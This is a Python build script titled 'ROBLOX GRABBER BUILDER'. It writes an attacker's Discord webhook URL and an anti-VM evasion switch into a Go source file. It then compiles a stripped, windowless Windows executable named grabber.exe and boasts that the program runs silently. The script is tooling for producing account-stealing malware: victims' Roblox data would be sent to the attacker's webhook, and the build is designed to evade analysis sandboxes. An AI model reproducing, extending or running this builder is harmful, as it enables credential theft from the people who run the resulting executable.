import os
import subprocess
import shutil
import re
import sys
import time
from colorama import init, Fore, Back, Style

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_gradient_text(text, start_color, end_color, center=False):
    colors = []
    for i in range(len(text)):
        ratio = i / len(text) if len(text) > 0 else 0
        r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
        colors.append(f'\033[38;2;{r};{g};{b}m{text[i]}')
    
    output = ''.join(colors) + Fore.RESET
    if center:
        terminal_width = shutil.get_terminal_size().columns
        padding = max(0, (terminal_width - len(text)) // 2)
        print(' ' * padding + output)
    else:
        print(output)

def print_gradient_box(text, start_color, end_color):
    """Print a gradient box around text"""
    text_len = len(text)
    box_width = text_len + 4
    
    print_gradient_text("╔" + "═" * box_width + "╗", start_color, end_color)
    print_gradient_text("║  " + text + "  ║", start_color, end_color)
    print_gradient_text("╚" + "═" * box_width + "╝", end_color, start_color)

def print_ascii():
    ascii_art = r"""
███╗░░██╗░█████╗░███╗░░░███╗░█████╗░██████╗░
████╗░██║██╔══██╗████╗░████║██╔══██╗██╔══██╗
██╔██╗██║██║░░██║██╔████╔██║███████║██║░░██║
██║╚████║██║░░██║██║╚██╔╝██║██╔══██║██║░░██║
██║░╚███║╚█████╔╝██║░╚═╝░██║██║░░██║██████╔╝
╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░
"""
    
    for line in ascii_art.split('\n'):
        if line.strip():
            print_gradient_text(line, (0, 100, 255), (150, 0, 255), center=True)
    print()
    
    print_gradient_text("◢" + "━" * 54 + "◣", (42, 10, 61), (106, 0, 244), center=True)
    print_gradient_text("┃" + " " * 16 + "ROBLOX GRABBER BUILDER" + " " * 17 + "┃", (106, 0, 150), (106, 0, 244), center=True)
    print_gradient_text("◥" + "━" * 54 + "◤", (106, 0, 244), (42, 10, 61), center=True)
    print()
    
    print_gradient_text("                  by @set4life", (150, 0, 100), (255, 0, 150), center=True)
    print()

def print_section(title):
    """Print section with gradient borders"""
    print()
    print_gradient_text("┌" + "─" * 48 + "┐", (80, 80, 100), (0, 150, 200))
    padding = (48 - len(title)) // 2
    print_gradient_text("│" + " " * padding + title + " " * (48 - padding - len(title)) + "│", (0, 150, 200), (100, 200, 255))
    print_gradient_text("└" + "─" * 48 + "┘", (100, 200, 255), (80, 80, 100))
    print()

def print_step(step_num, message, status="pending"):
    if status == "pending":
        icon = "○"
        color = Fore.YELLOW
    elif status == "running":
        icon = "▶"
        color = Fore.CYAN
    elif status == "success":
        icon = "✓"
        color = Fore.GREEN
    elif status == "error":
        icon = "✗"
        color = Fore.RED
    else:
        icon = "●"
        color = Fore.WHITE
    
    step_text = f"  {icon} [{step_num}] {message}"
    if status == "success":
        print_gradient_text(step_text, (0, 255, 0), (100, 255, 100))
    elif status == "error":
        print_gradient_text(step_text, (255, 0, 0), (255, 100, 100))
    elif status == "running":
        print_gradient_text(step_text, (0, 200, 255), (100, 255, 200))
    else:
        print(f"  {icon} {color}{message}{Fore.RESET}")

def get_user_input(prompt, default=None, password=False):
    print()
    print_gradient_text("╭─[INPUT]─", (255, 200, 0), (255, 100, 0))
    print_gradient_text("╰──╼ " + prompt, (200, 200, 200), (255, 255, 255))
    
    if password:
        import getpass
        value = getpass.getpass("    > ")
    else:
        value = input("    > ")
    
    if not value and default:
        value = default
        print_gradient_text(f"    [using default: {default}]", (100, 200, 255), (0, 150, 200))
    
    return value.strip()

def loading_animation(message, duration=1):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        gradient_char = f'\033[38;2;{100 + i * 15};{50 + i * 20};{200}m{chars[i % len(chars)]}'
        sys.stdout.write(f"\r{gradient_char} {message}{Fore.RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write(f"\r{Fore.GREEN}✓ {message}{Fore.RESET}\n")

def modify_main_go(webhook, anti_vm):
    main_path = "src/main.go"
    
    if not os.path.exists(main_path):
        print_step(1, "src/main.go not found!", "error")
        return False
    
    print_step(1, "Modifying source code...", "running")
    loading_animation("Processing source file", 0.5)
    
    with open(main_path, "r", encoding='utf-8') as f:
        content = f.read()
    
    content = re.sub(r'var g_webhookURL = "[^"]*"', f'var g_webhookURL = "{webhook}"', content)
    anti_vm_str = "true" if anti_vm else "false"
    content = re.sub(r'var g_anti_vm = (true|false)', f'var g_anti_vm = {anti_vm_str}', content)
    content = re.sub(r'var g_verbose = (true|false)', 'var g_verbose = false', content)
    
    with open(main_path, "w", encoding='utf-8') as f:
        f.write(content)
    
    print_step(1, "Configuration applied successfully", "success")
    return True

def build_exe(output_name):
    print_step(2, "Building executable...", "running")
    loading_animation("Compiling Go code", 1.5)
    
    os.chdir("src")
    
    subprocess.run(["go", "mod", "tidy"], capture_output=True, cwd=".")
    
    cmd = ["go", "build", "-ldflags=-H windowsgui -s -w", "-o", output_name, "main.go"]
    result = subprocess.run(cmd, capture_output=True, cwd=".")
    
    os.chdir("..")
    
    if result.returncode == 0:
        src_exe = os.path.join("src", output_name)
        if os.path.exists(src_exe):
            shutil.move(src_exe, output_name)
            size = os.path.getsize(output_name) // 1024
            print_step(2, f"Build successful: {output_name} ({size} KB)", "success")
            return True
    
    print_step(2, "Build failed!", "error")
    if result.stderr:
        print(Fore.RED + f"    {result.stderr.decode()}" + Fore.RESET)
    return False

def print_summary(webhook, anti_vm, output_name):
    print()
    print_gradient_text("◢" + "◤" * 54 + "◣", (0, 200, 255), (0, 100, 200))
    print_gradient_text("█" + " " * 15 + "BUILD SUCCESSFUL!" + " " * 18 + "█", (0, 255, 100), (0, 150, 50))
    print_gradient_text("◥" + "◢" * 54 + "◤", (0, 100, 200), (0, 200, 255))
    print()
    
    output_size = f"{os.path.getsize(output_name) // 1024} KB"
    webhook_short = webhook[:50] + "..." if len(webhook) > 50 else webhook
    anti_vm_status = "ENABLED" if anti_vm else "DISABLED"
    anti_vm_color_start = (0, 255, 0) if anti_vm else (255, 0, 0)
    anti_vm_color_end = (100, 255, 100) if anti_vm else (255, 100, 100)
    
    print_gradient_text(f"  ╭──────────────────────────────────────────╮", (100, 100, 100), (150, 150, 150))
    print_gradient_text(f"  │  📦 OUTPUT   {output_name}" + " " * (30 - len(output_name)) + "│", (200, 200, 200), (255, 255, 255))
    print_gradient_text(f"  │  💾 SIZE     {output_size}" + " " * (30 - len(output_size)) + "│", (200, 200, 200), (255, 255, 255))
    print_gradient_text(f"  │  🔗 WEBHOOK  {webhook_short}" + " " * (30 - len(webhook_short)) + "│", (200, 200, 200), (255, 255, 255))
    print_gradient_text(f"  │  🛡️ ANTI-VM  {anti_vm_status}" + " " * (30 - len(anti_vm_status)) + "│", anti_vm_color_start, anti_vm_color_end)
    print_gradient_text(f"  ╰──────────────────────────────────────────╯", (150, 150, 150), (100, 100, 100))
    print()
    
    print_gradient_text("  ╔════════════════════════════════════════════╗", (255, 100, 0), (255, 200, 0))
    print_gradient_text("  ║     ✨ STANDALONE EXECUTABLE - READY!     ✨  ║", (255, 200, 0), (255, 100, 0))
    print_gradient_text("  ╚════════════════════════════════════════════╝", (255, 200, 0), (255, 100, 0))
    print()
    
    print_gradient_text("  ⚠️  Runs silently (no console window)", (255, 100, 100), (255, 50, 50))
    print()

def main():
    clear_screen()
    print_ascii()
    
    print_section("CONFIGURATION")
    
    webhook = get_user_input("Discord Webhook URL:")
    if not webhook:
        print()
        print_gradient_text("╔════════════════════════════════════════════╗", (255, 0, 0), (200, 0, 0))
        print_gradient_text("║  ❌ ERROR: Webhook URL is required!        ║", (255, 0, 0), (200, 0, 0))
        print_gradient_text("╚════════════════════════════════════════════╝", (200, 0, 0), (255, 0, 0))
        input("\nPress Enter to exit...")
        return
    
    anti_vm_input = get_user_input("Enable Anti-VM detection? (Y/n):", "Y")
    anti_vm = anti_vm_input.lower() != "n"
    
    output_name = get_user_input("Output filename (grabber.exe):", "grabber.exe")
    
    print_section("BUILD PROCESS")
    
    if modify_main_go(webhook, anti_vm):
        if build_exe(output_name):
            clear_screen()
            print_ascii()
            print_summary(webhook, anti_vm, output_name)
            
            print_gradient_text("  [?] Open containing folder? (Y/n): ", (255, 200, 0), (255, 100, 0), center=False)
            open_folder = input().strip().lower()
            if open_folder != "n":
                os.startfile(os.path.dirname(os.path.abspath(output_name)))
            
            print()
            input(Fore.CYAN + "Press Enter to exit..." + Fore.RESET)
            return
    
    print()
    print_gradient_text("╔════════════════════════════════════════════╗", (255, 0, 0), (200, 0, 0))
    print_gradient_text("║  ❌ BUILD FAILED - Check errors above      ║", (255, 0, 0), (200, 0, 0))
    print_gradient_text("╚════════════════════════════════════════════╝", (200, 0, 0), (255, 0, 0))
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()